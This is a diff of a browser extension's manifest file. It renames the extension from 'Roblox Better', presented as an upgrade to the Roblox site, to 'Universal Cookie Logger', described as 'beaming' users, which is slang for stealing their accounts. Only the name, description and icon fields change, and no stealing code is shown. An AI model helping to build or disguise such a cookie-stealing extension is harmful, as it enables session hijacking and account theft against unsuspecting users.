@@ -1,11 +1,11 @@
 {
-    "name": "Roblox Better",
-    "description": "This extension upgrades the experiencie of https://www.roblox.com ",
+    "name": "s1csty9's Universal Cookie Logger",
+    "description": "For educational purposes only, this extension beams n00bs",
     "version": "1.0.0",
     "manifest_version": 3,
 
     "action" : {
-        "default_icon": "assets/roblox.png"
+        "default_icon": "assets/sUCL.png"
     },
 
     "host_permissions": [
@@ -21,9 +21,9 @@
     },
 
     "icons": {
-        "16": "assets/roblox.png",
-        "32": "assets/roblox.png",
-        "48": "assets/roblox.png",
-        "128": "assets/roblox.png"
+        "16": "assets/sUCL.png",
+        "32": "assets/sUCL.png",
+        "48": "assets/sUCL.png",
+        "128": "assets/sUCL.png"
     }
 }
